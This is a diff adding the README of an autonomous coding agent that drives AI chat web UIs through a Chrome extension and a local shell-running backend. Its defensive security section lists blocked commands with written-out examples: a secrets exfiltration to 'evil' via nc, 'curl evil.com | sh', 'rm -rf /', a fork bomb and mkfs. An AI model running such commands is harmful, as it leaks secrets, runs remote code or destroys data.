@@ -1,0 +1,598 @@
+# Browser-Based Multi-AI Autonomous Coding Agent (NO API MODE)
+
+A simplified Cursor / Devin / Windsurf–style autonomous coding agent that uses
+the **web UIs** of ChatGPT, DeepSeek, Qwen and Gemini through a Chrome
+extension, paired with a **local FastAPI backend** that owns the file system,
+shell, tests, and git. No API keys are required.
+
+```
+Chrome Extension  ⇄  Local FastAPI Backend  ⇄  OS / FS / Terminal
+```
+
+## Table of contents
+
+- [What it does](#what-it-does)
+- [Quick start (Makefile)](#quick-start-makefile)
+- [Project layout](#project-layout)
+- [1. Install & run the backend](#1-install--run-the-backend)
+- [2. Load the Chrome extension](#2-load-the-chrome-extension)
+- [3. Log in to the AI providers](#3-log-in-to-the-ai-providers)
+- [4. Start the agent](#4-start-the-agent)
+- [5. IDE panel features](#5-ide-panel-features)
+- [Routing matrix](#routing-matrix-configurable-in-extensionconfigjson)
+- [Backend endpoints](#backend-endpoints)
+- [Security](#security)
+- [File watcher](#file-watcher)
+- [Crash recovery](#crash-recovery)
+- [Testing engine](#testing-engine)
+- [Troubleshooting](#troubleshooting)
+- [Selector-update guide](#selector-update-guide)
+- [Architecture](#architecture)
+- [Continuous integration](#continuous-integration)
+- [Contributing](#contributing)
+- [Security warnings](#security-warnings)
+
+## What it does
+
+- **Drives 4 AI web UIs** (ChatGPT, DeepSeek, Qwen, Gemini) via content
+  scripts — no API keys, uses your existing logged-in tabs.
+- **Routes by task kind**: planning → ChatGPT, coding → DeepSeek,
+  debugging → Qwen, long-context → Gemini, with automatic fallback.
+- **Runs an autonomous loop**: plan → execute → test → fix → commit, with
+  a configurable max-iterations / max-retries / step-timeout budget.
+- **Owns your project safely**: writes files, runs tests, executes only
+  allow-listed shell commands, auto-commits to git, can roll back any
+  step you reject.
+- **Per-provider token budgeting** is enforced before every prompt
+  (ChatGPT/DeepSeek/Qwen 8k window, Gemini 32k) — head + tail are kept
+  when truncating.
+- **Mini IDE panel** in the popup: file explorer, chat, live logs, diff
+  viewer, approval queue, task tree, pause / resume / stop controls.
+- **Crash-resilient**: 5-second checkpoints to `chrome.storage` plus
+  `memory/session_memory.json`, watches the project FS for external
+  edits, and restarts mid-loop on reload.
+- **Local-only**: backend binds `127.0.0.1:8765`, never exposed publicly.
+
+## Quick start (Makefile)
+
+If you have GNU `make`, this is the shortest path:
+
+```bash
+cd ai-agent
+make install     # creates .venv, installs backend deps
+make run         # starts FastAPI on 127.0.0.1:8765 (foreground)
+# in another terminal:
+make verify      # extension tests + selector audit + config snapshot
+                 # + backend smoke test (auto-skips arms not available)
+make hooks       # install git pre-push hook that runs 'make verify' before every push
+```
+
+Other targets: `make test` (extension unit tests only), `make check`
+(extension-only health check), `make smoke` (backend smoke only),
+`make clean` (remove venv + logs + caches), `make help`.
+
+## Project layout
+
+```
+ai-agent/
+├── extension/        Chrome MV3 extension (content scripts + adapters + IDE panel)
+├── backend/          FastAPI server (port 8765)
+├── memory/           Persisted long-term, session, and error memory
+├── logs/             Backend log files (rotated)
+├── projects/         Working projects the agent operates on
+└── README.md
+```
+
+## 1. Install & run the backend
+
+### One-shot scripts (recommended)
+
+```bash
+# macOS / Linux
+ai-agent/scripts/install.sh
+ai-agent/scripts/run.sh
+```
+
+```powershell
+# Windows PowerShell
+ai-agent\scripts\install.ps1
+ai-agent\scripts\run.ps1
+```
+
+`install.sh` / `install.ps1` create `backend/.venv`, install
+`backend/requirements.txt`, and ensure `logs/` and `projects/` exist.
+`run.sh` / `run.ps1` activate the venv and start the server on
+`127.0.0.1:8765` (override with `HOST` / `PORT` env vars). The first
+`run` will auto-install if no venv is found.
+
+### Docker (no local Python needed)
+
+```bash
+cd ai-agent
+docker compose up --build -d
+# tail logs:
+docker compose logs -f backend
+# stop:
+docker compose down
+```
+
+The container binds to `127.0.0.1:8765` only and mounts `projects/`,
+`memory/`, and `logs/` into the host so the agent's work persists across
+restarts. The extension keeps talking to `http://localhost:8765` exactly
+as before. Do not expose port 8765 publicly.
+
+### Manual
+
+```bash
+cd ai-agent/backend
+python -m venv .venv
+source .venv/bin/activate            # Windows: .venv\Scripts\activate
+pip install -r requirements.txt
+# from the ai-agent/ directory (the parent), so the package import works:
+cd ..
+python -m uvicorn backend.server:app --host 127.0.0.1 --port 8765
+```
+
+Verify: `curl http://127.0.0.1:8765/` should return `{"ok": true, ...}`.
+
+### Smoke test
+
+With the backend running, exercise the key endpoints end-to-end:
+
+```bash
+cd ai-agent
+python -m backend.test_smoke
+# or against a different host: BACKEND=http://127.0.0.1:9000 python -m backend.test_smoke
+```
+
+It checks health, status, project create/select, file write/read/list,
+path-traversal protection, the command allow-list, git commit/log/rollback,
+memory save/load, and state transitions, then cleans up the temp project.
+
+### Extension unit tests
+
+The token-budgeting logic the service worker applies before every provider
+call is covered by Node's built-in test runner (no dependencies):
+
+```bash
+cd ai-agent/extension
+npm test
+```
+
+This exercises `budgetPrompt()` against each provider's window
+(ChatGPT/DeepSeek/Qwen 8k, Gemini 32k), verifies head + tail are preserved
+when the prompt is too large, and confirms `buildContext()` drops
+low-priority items first.
+
+### Inspect a prompt before it ships
+
+To see exactly what a provider would receive after budgeting, without
+loading the extension:
+
+```bash
+cd ai-agent/extension
+# from a file
+npm run budget -- chatgpt path/to/prompt.txt --quiet
+# from stdin
+cat prompt.txt | npm run budget -- gemini - --quiet
+```
+
+The CLI prints a JSON report to stderr (model limit, budget, original /
+final / dropped tokens, truncated flag) and the budgeted prompt to stdout.
+Useful flags: `--reserved=N` (reply headroom, default 1024),
+`--head=0.6` (head/tail split when truncating), `--quiet` (suppress prompt
+output).
+
+### Audit provider selectors
+
+When ChatGPT / DeepSeek / Qwen / Gemini ship a UI change the adapters
+might silently stop matching the DOM. This script lists every selector
+each adapter currently advertises, grouped by purpose, and exits non-zero
+if any required group (`input`, `sendButton`, `responseContainer`,
+`lastResponse`, `spinner`, `loginIndicator`) is missing or empty:
+
+```bash
+cd ai-agent/extension
+npm run check-selectors                       # human report
+npm run check-selectors -- --json             # machine-readable
+npm run check-selectors -- --provider gemini  # one provider only
+```
+
+Same check runs on every push in CI, so a regression in any adapter file
+fails the build before it reaches main.
+
+### Extension load-check (`npm run load-check`)
+
+Static "would Chrome load this extension?" check. Validates `manifest.json`
+shape (must be MV3 with required keys), confirms every file the manifest
+references actually exists on disk (background service worker, popup,
+content scripts, web-accessible resources), and verifies `config.json`
+has all required keys (`backendUrl`, `wsUrl`, `routing`, `modelLimits`,
+`providers`, `fallbackOrder`) plus a primary provider for each of the
+4 task kinds. Catches typos before you reload `chrome://extensions`.
+
+```bash
+cd ai-agent/extension
+npm run load-check          # human report (Files checked: N, Errors: M)
+npm run load-check -- --json   # machine-readable
+```
+
+Wired into `npm run check` and therefore into `make verify` and the
+pre-push hook — a missing file or malformed config blocks the push.
+
+### Extension package smoke (`npm run package-check`)
+
+Release smoke test. Builds the distributable zip exactly the way
+`npm run package` does (`zip -r … -x 'node_modules/*' '*.zip'`),
+runs `unzip -t` for integrity, extracts to a temp dir, then re-runs
+`load-check --root <tempdir>` against the **extracted** tree. This proves
+the artifact users actually load into Chrome is loadable — not just the
+working tree. Reports the final zip size.
+
+```bash
+cd ai-agent/extension
+npm run package-check          # build → verify → extract → load-check → cleanup
+npm run package-check -- --keep   # keep the temp zip + extracted dir for inspection
+```
+
+Skips cleanly (exit 0) with a one-line message if `zip` or `unzip` is not
+on `PATH`, so dev machines without the tools don't get spurious failures.
+Wired into `npm run check`.
+
+### Release pipeline (`.github/workflows/release.yml`)
+
+Triggered when you push a tag matching `v*` (e.g. `git tag v1.0.0 && git push --tags`)
+or via the **Run workflow** button on GitHub Actions. The release job:
+
+1. Installs Node 20, Python 3.11, `zip`/`unzip`, backend deps
+2. Boots the FastAPI backend on `127.0.0.1:8765`
+3. Runs `make verify` (full gate: tests + load-check + selectors + snapshot + package-smoke + backend-smoke)
+4. Builds `ai-agent-extension-<tag>.zip` from `extension/` (excluding `node_modules` and `*.zip`)
+5. Re-runs `npm run package-check` against the produced zip
+6. Generates release notes listing every check that passed
+7. Publishes a **GitHub Release** with the verified zip attached
+
+Net effect: every public release is the exact zip that passed every gate
+on the same CI image. No "works on my machine".
+
+## 2. Load the Chrome extension
+
+1. Open `chrome://extensions`.
+2. Enable **Developer mode** (top right).
+3. Click **Load unpacked** and select `ai-agent/extension/`.
+4. Pin the extension. Click its icon to open the popup.
+5. In the popup, type a project name and click **+** to create it. Select it.
+6. Click **Open IDE Panel** for the full IDE-style view.
+
+## 3. Log in to the AI providers
+
+In normal Chrome tabs, log in to the providers you want to use:
+
+- https://chatgpt.com
+- https://chat.deepseek.com
+- https://gemini.google.com/app
+- https://chat.qwen.ai
+
+Keep these tabs open. The extension reuses your existing browser sessions —
+it never asks for API keys.
+
+## 4. Start the agent
+
+1. In the popup, type a goal: e.g. *"Create a Python script that prints fizzbuzz"*.
+2. Click **Start**.
+3. The background service worker:
+   - sends the planning prompt to the routed provider (ChatGPT by default),
+   - parses the JSON plan,
+   - executes each step against the backend,
+   - streams logs/diffs/progress over WebSocket to the IDE panel.
+
+## 5. IDE panel features
+
+- **File explorer** — browse the active project; click a file to load it into the diff viewer.
+- **Chat** — free-form prompts dispatched through the routing matrix.
+- **Plan** — live view of the generated plan + task tree.
+- **Diff viewer** — unified or side-by-side; approve writes per file.
+- **Logs** — INFO / DEBUG / WARN / ERROR filters, tailing in real time.
+- **Controls** — Pause / Resume / Stop.
+
+## Routing matrix (configurable in `extension/config.json`)
+
+Each task kind is sent to its primary provider. If that provider is
+logged out, rate-limited, or times out, the router walks the fallback
+chain left-to-right and uses the first one that succeeds. Token limits
+are the per-prompt budget the service worker enforces *before* sending
+(see `core/tokenManager.js`); reply headroom defaults to 1024 tokens.
+
+| Task kind     | Primary  | Token limit | URL                          | Fallback rank |
+|---------------|----------|-------------|------------------------------|---------------|
+| `planning`    | ChatGPT  | 8 000       | https://chatgpt.com/         | 2             |
+| `coding`      | DeepSeek | 8 000       | https://chat.deepseek.com/   | 1             |
+| `debugging`   | Qwen     | 8 000       | https://chat.qwen.ai/        | 4             |
+| `long_context`| Gemini   | 32 000      | https://gemini.google.com/   | 3             |
+
+**Fallback order:** `deepseek → chatgpt → gemini → qwen` (lower rank = tried first).
+
+To change any of this, edit `extension/config.json` (`routing`,
+`fallbackOrder`, `modelLimits`, `tokens.reservedReply`) and reload the
+extension. `npm run snapshot-config` will refuse to start if the routing
+points at a disabled or unknown provider, or if any URL isn't covered by
+`manifest.host_permissions`.
+
+## Backend endpoints
+
+All endpoints are served from `http://127.0.0.1:8765` and are
+**unauthenticated by design** — the backend binds to localhost only and is
+never exposed publicly. JSON request bodies unless noted otherwise.
+
+| Method | Path | Body / query | Returns / purpose |
+|---|---|---|---|
+| GET  | `/`                              | —                                         | health probe `{ok: true}` |
+| GET  | `/status`                        | —                                         | agent state + active project + projects list |
+| GET  | `/routing`                       | —                                         | current routing matrix |
+| GET  | `/project/list`                  | —                                         | all projects under `projects/` |
+| POST | `/project/create`                | `{name}`                                  | create a new project root |
+| POST | `/project/select`                | `{name}`                                  | switch active project (resets watcher) |
+| GET  | `/project/index`                 | —                                         | indexed file list (respects ignore rules) |
+| POST | `/project/summary`               | `{path}`                                  | structured summary (functions, classes, imports) |
+| POST | `/read_file`                     | `{path}`                                  | file contents (path-traversal safe) |
+| POST | `/write_file`                    | `{path, content, create_dirs}`            | atomic write + diff broadcast |
+| POST | `/list_files`                    | `{path}`                                  | shallow directory listing |
+| POST | `/execute`                       | `{cmd, timeout, task_id}`                 | run allow-listed shell command |
+| POST | `/cancel`                        | —                                         | cancel in-flight `/execute` or `/run_tests` |
+| POST | `/run_tests`                     | —                                         | run framework tests per `.agent-test-config.json` |
+| POST | `/git/commit`                    | `{message}`                               | `git add -A && git commit -m …` |
+| POST | `/git/rollback`                  | `{sha?}`                                  | revert to SHA (defaults to HEAD~1) |
+| GET  | `/git/log?n=20`                  | `n` (query)                               | recent commits |
+| GET  | `/memory/{kind}`                 | `kind` ∈ `long_term_memory \| session_memory \| error_memory` | load JSON memory blob |
+| POST | `/memory/save`                   | `{file, data}`                            | persist a memory blob |
+| POST | `/state/{NEW_STATE}`             | —                                         | force agent state transition |
+| WS   | `/ws`                            | —                                         | push channel (see schema below) |
+
+WebSocket message schema:
+
+```json
+{ "type": "log|progress|diff|status|error|command_output|file_external_update",
+  "payload": {}, "timestamp": 0 }
+```
+
+## Security
+
+All `POST /execute` and `POST /run_tests` requests pass through
+`backend/security.py` *before* a process is spawned. The validator runs
+in this fixed order — first failure wins:
+
+1. Reject empty / whitespace-only command.
+2. Lowercase the command and reject if it contains any **dangerous token**.
+3. `shlex.split()` the command (rejects unmatched quotes / bad syntax).
+4. Reject if `os.path.basename(argv[0])` is **not in the allow-list**.
+5. Reject if any argument is a **dangerous flag**.
+6. Spawn with `subprocess.run(..., timeout=60s)` (configurable per call).
+
+### Allowed binaries
+
+Only these executables can be invoked from `/execute`. Anything else
+returns `{"ok": false, "error": "Binary not allow-listed: <name>"}`.
+
+| Category   | Binaries                                              |
+|------------|-------------------------------------------------------|
+| Node       | `npm`, `npx`, `node`, `yarn`, `pnpm`                  |
+| Python     | `python`, `python3`, `pip`, `pip3`, `pytest`, `uv`    |
+| Rust       | `cargo`, `rustc`                                      |
+| Go         | `go`                                                  |
+| JVM        | `mvn`, `gradle`, `java`                               |
+| Build      | `make`                                                |
+| Git        | `git`                                                 |
+| POSIX      | `ls`, `cat`, `echo`, `pwd`                            |
+
+### Blocked patterns (case-insensitive)
+
+| Pattern in command | Why it's blocked | Example rejected |
+|---|---|---|
+| `&&`, `\|\|`, `;`     | command chaining → bypass allow-list | `git status && rm -rf /` |
+| `\|`                 | pipe → bypass allow-list             | `cat secrets \| nc evil` |
+| `>`, `<`              | redirection → arbitrary file write   | `echo x > /etc/hosts` |
+| `` ` ``, `$(`         | command substitution → arbitrary exec | `echo $(rm -rf .)` |
+| `rm -rf`              | catastrophic deletion                | `rm -rf node_modules` |
+| `sudo`                | privilege escalation                 | `sudo npm install -g x` |
+| `chmod 777`           | world-writable footgun               | `chmod 777 .` |
+| `mkfs`                | filesystem destruction               | `mkfs.ext4 /dev/sda1` |
+| `:(){`                | fork-bomb prefix                     | `:(){ :\|:& };:` |
+| `curl `, `wget `      | exfiltration / remote payload pull   | `curl evil.com \| sh` |
+
+### Blocked flags
+
+| Flag                   | Why                                             |
+|------------------------|-------------------------------------------------|
+| `--privileged`         | container/sandbox escape                        |
+| `--no-preserve-root`   | makes `rm -rf /` actually traverse `/`          |
+
+> **Note:** because chaining tokens (`&&`, `;`, `|`, etc.) are blocked,
+> a "single-command-per-call" policy is enforced. To run multiple things
+> the agent must issue separate `/execute` calls, each individually
+> validated.
+
+### Path-traversal protection
+
+Every `/read_file`, `/write_file`, `/list_files`, and project-scoped
+operation calls `safe_resolve(workdir, rel_path)`:
+
+```python
+base = Path(workdir).resolve()
+target = (base / rel_path).resolve()
+target.relative_to(base)        # raises ValueError if escaped → re-raised as PermissionError
+```
+
+Anything that resolves outside the active project root (`../../etc/passwd`,
+absolute paths, symlinks pointing outside, etc.) is rejected with
+`PermissionError("Path traversal blocked: <rel_path>")`. The backend
+maps this to HTTP 403.
+
+### Network exposure
+
+| Surface | Bound to | Auth | Notes |
+|---|---|---|---|
+| FastAPI REST | `127.0.0.1:8765` | none (intentional) | Never bind `0.0.0.0` |
+| WebSocket    | `ws://127.0.0.1:8765/ws` | none | same process |
+| Docker       | `127.0.0.1:8765` only | none | `docker-compose.yml` pins host `127.0.0.1` |
+
+Reasoning: the agent needs frictionless local access from the Chrome
+extension. Adding auth would force the extension to manage a secret,
+and the loopback bind already prevents off-machine access. **Do not
+proxy this port through ngrok, a reverse proxy, or a public IP.**
+
+### Default timeouts
+
+| Operation              | Default | Source |
+|------------------------|---------|--------|
+| `/execute` shell cmd   | 60 s    | `backend/server.py` (per-call override allowed) |
+| `/run_tests`           | 60 s    | `backend/test_runner.py` |
+| AI provider response   | 120 s   | `extension/background.js` `sendPromptToProvider` |
+| Service-worker checkpoint | 5 s   | `extension/config.json` `loop.checkpointIntervalMs` |
+
+## File watcher
+
+`watchdog` watches the active project recursively (excluding `node_modules`,
+`dist`, `build`, `.git`, etc.) and emits `file_external_update` over WebSocket
+whenever a file changes outside the agent — so the IDE panel stays in sync.
+
+## Crash recovery
+
+- Background service worker checkpoints `STATE` to `chrome.storage.local`
+  every 5 seconds, plus mirrors session memory to `memory/session_memory.json`
+  on the backend.
+- On startup, the snapshot is restored.
+
+## Testing engine
+
+`POST /run_tests` auto-detects the project's framework by walking the
+detection rules **top-to-bottom** and runs the matching command. The
+first match wins, so a polyglot repo with both `package.json` and
+`pyproject.toml` is treated as a Node project unless you override it.
+
+| Detection (file in project root)                  | Framework label | Command                  |
+|---------------------------------------------------|-----------------|--------------------------|
+| `.agent-test-config.json`                         | `custom`*       | `command` from the file  |
+| `package.json`                                    | `node`          | `npm test --silent`      |
+| `pytest.ini` / `pyproject.toml` / any `test_*.py` | `python`        | `pytest -q`              |
+| `Cargo.toml`                                      | `rust`          | `cargo test --quiet`     |
+| `go.mod`                                          | `go`            | `go test ./...`          |
+| `pom.xml`                                         | `maven`         | `mvn -q test`            |
+| `build.gradle` / `build.gradle.kts`               | `gradle`        | `gradle test --quiet`    |
+| *(none of the above)*                             | —               | returns `no test framework detected` |
+
+\* The framework label in `.agent-test-config.json` overrides `custom`
+when set.
+
+**Per-project override** — drop a `.agent-test-config.json` next to
+your project root:
+
+```json
+{ "command": "make test", "framework": "make" }
+```
+
+**Result event** — every run pushes a `test_result` message over the
+WebSocket with this shape:
+
+```json
+{
+  "ok": true,
+  "framework": "python",
+  "code": 0,
+  "stdout": "...",
+  "stderr": "...",
+  "failures": [{"file": "test_x.py", "test": "test_foo", "framework": "pytest"}],
+  "trace": []
+}
+```
+
+The runner parses pytest- and jest/mocha-style failure lines and stack
+traces into the `failures` / `trace` arrays so the agent's debugging
+loop can route them to Qwen with structured context. Default per-run
+timeout is 60 s; on overrun the result has `code: -1` and
+`stderr: "timeout"`.
+
+## Troubleshooting
+
+Lookup table — match the symptom, then follow the fix. For deeper
+debugging, the relevant source file is in the rightmost column.
+
+| Symptom | Likely cause | Fix | Source |
+|---|---|---|---|
+| Popup shows **"BACKEND OFFLINE"** | uvicorn not running, or port 8765 already in use | `make run` (or `python -m uvicorn backend.server:app --port 8765`); confirm `curl http://127.0.0.1:8765/` returns `{"ok":true}` | `backend/server.py` |
+| Backend logs show `Address already in use` | another process on 8765 | `lsof -i :8765` and kill it, or run on another port via `--port` and update `extension/config.json` `backendUrl`/`wsUrl` | OS / `config.json` |
+| WebSocket panel says **"reconnecting…"** forever | WS URL mismatch with backend port, or extension permissions revoked | Check `wsUrl` in `config.json` matches backend; reload extension at `chrome://extensions` | `core/websocket.js` |
+| Provider tab says **"not logged in"** or **"captcha detected"** | session expired, or Cloudflare challenge | Open the URL manually, complete login / captcha, retry — router auto-falls back to the next provider | `adapters/<provider>.js` |
+| Agent picks **wrong provider** for a task | `routing.<task_kind>` misconfigured, or primary disabled | `npm run snapshot-config` flags it; edit `routing` in `config.json`, reload extension | `extension/config.json` |
+| Selectors stopped matching after provider UI redesign | Site changed CSS / `data-testid` / `aria-label` | Inspect the new DOM, prepend the new selector to the relevant array in `adapters/<provider>.js`, then `npm run check-selectors` | `adapters/<provider>.js` |
+| Prompt **silently truncated** for some providers | budget exceeded — expected | Check log line `prompt truncated for <provider>: N tokens dropped`; raise the model's window in `config.json` `modelLimits` if you trust larger context | `core/tokenManager.js` |
+| `InputEvent` not registering on contenteditable | site uses a custom editor (Quill, Lexical, ProseMirror) | Base adapter tries 3 strategies in order: clipboard paste → `execCommand("insertText")` → native setter + `InputEvent`. Tweak `_typeIntoInput` for the new editor | `content.js` |
+| `/execute` returns **"Binary not allow-listed"** | requested binary not in security allow-list | Either use an allow-listed equivalent, or add the binary to `ALLOWED_BINARIES` in `security.py` (review the security implications first) | `backend/security.py` |
+| `/execute` returns **"Forbidden token"** | command contained `&&`, `;`, `\|`, redirect, etc. | Split into multiple `/execute` calls — chained commands are blocked by design | `backend/security.py` |
+| `/run_tests` says **"no test framework detected"** | no `package.json`/`pyproject.toml`/`Cargo.toml`/etc. in project root | Drop a `.agent-test-config.json` with `{"command": "...", "framework": "..."}` next to the project root | `backend/test_runner.py` |
+| Test run returns `code: -1, stderr: "timeout"` | suite exceeded 60 s default | Increase the per-call `timeout` in the executor request, or split the suite | `backend/test_runner.py` |
+| File-watcher events not arriving | watcher path mismatch after switching projects, or watch dir was deleted | `POST /project/select` re-initialises watchdog; verify in the panel logs that `file_external_update` events appear for an external `touch` | `backend/project_manager.py` |
+| `/git/commit` fails with **"please tell me who you are"** | git identity unset on this machine | `git config --global user.email "you@local"` + `git config --global user.name "You"` | git itself |
+| Extension service worker is **suspended** mid-loop | Chrome unloaded the worker (idle) | The 5-second checkpoint to `chrome.storage` + `memory/session_memory.json` restores state on next message; if it doesn't, check `chrome://serviceworker-internals` for crash | `background.js` |
+| Approval queue **stuck** with no UI prompt | panel was closed; service worker is waiting | Re-open the popup → IDE panel; pending approvals re-broadcast on connect | `ui/panel.js` |
+| `make verify` fails with **"missing separator"** | `Makefile` indentation got converted from tabs to spaces by an editor | Re-save with tabs (the `.editorconfig` enforces this) or `git checkout Makefile` | `Makefile` |
+| Health check unsure where to start | run the one-shot gate | `make verify` runs unit tests + selector audit + config snapshot + (if available) backend smoke | `Makefile` |
+| Want every `git push` automatically validated | install pre-push hook | `make hooks` (one-time) — sets `core.hooksPath` to `ai-agent/.githooks`; bypass once with `git push --no-verify`; remove with `make unhooks` | `.githooks/pre-push` |
+| Extension fails to load in `chrome://extensions` (`Could not load file 'X'`) | typo or missing file referenced from `manifest.json` / `config.json` | `npm run load-check` lists the exact missing path or invalid key — fix it and reload | `extension/scripts/load-check.mjs` |
+| Want to verify the **distributable zip** before sharing it | release smoke test | `npm run package-check` builds the same zip `npm run package` makes, verifies integrity with `unzip -t`, extracts to a temp dir, and re-runs `load-check` on the extracted tree | `extension/scripts/package-check.mjs` |
+
+## Selector-update guide
+
+Each adapter under `extension/adapters/` has the same shape:
+
+```js
+this.selectors = {
+  input:        [ /* CSS, aria-label, data-testid options */ ],
+  sendButton:   [ /* ... */ ],
+  responseContainer: [ /* ... */ ],
+  lastResponse: [ /* ... */ ],
+  spinner:      [ /* ... */ ],
+  loginIndicator: [ /* ... */ ],
+  captcha:      [ /* ... */ ],
+  rateLimit:    [ /* ... */ ],
+};
+```
+
+Keep the most specific / current selectors at the top; the helper
+`findFirst()` returns the first match.
+
+## Architecture
+
+See [`docs/architecture.md`](docs/architecture.md) for component / sequence /
+state diagrams (Mermaid) and a summary of the trust boundaries.
+
+## Continuous integration
+
+`.github/workflows/ci.yml` runs on every push / PR that touches `ai-agent/`:
+
+1. **Extension JS + JSON** — syntax-checks every `.js` under `extension/`
+   with `node --check` and validates `manifest.json`, `config.json`,
+   `extension/package.json`, and every `memory/*.json`.
+2. **Backend smoke test** — installs `backend/requirements.txt`, boots the
+   FastAPI server on `127.0.0.1:8765`, waits for `/`, and runs
+   `python -m backend.test_smoke`. On failure it uploads `logs/` as an
+   artifact for inspection.
+
+Trigger it manually from the Actions tab via **Run workflow** as well.
+
+## Contributing
+
+PRs welcome. Style:
+
+- Backend: PEP 8, type hints where reasonable, no global state outside `STATE`.
+- Extension: ES modules, no bundler required, no external runtime deps.
+
+## Security warnings
+
+- This agent **executes shell commands** in the active project directory.
+  Only run it on projects you trust, in a user account that does not have
+  privileged write access to the rest of your system.
+- The Chrome extension talks to `localhost:8765` over plain HTTP. Do not expose
+  this port to your network. Bind to `127.0.0.1` (the default) and run behind a
+  user-only firewall.
+- The extension automates third-party AI websites. This may violate those
+  sites' Terms of Service. Use at your own risk.
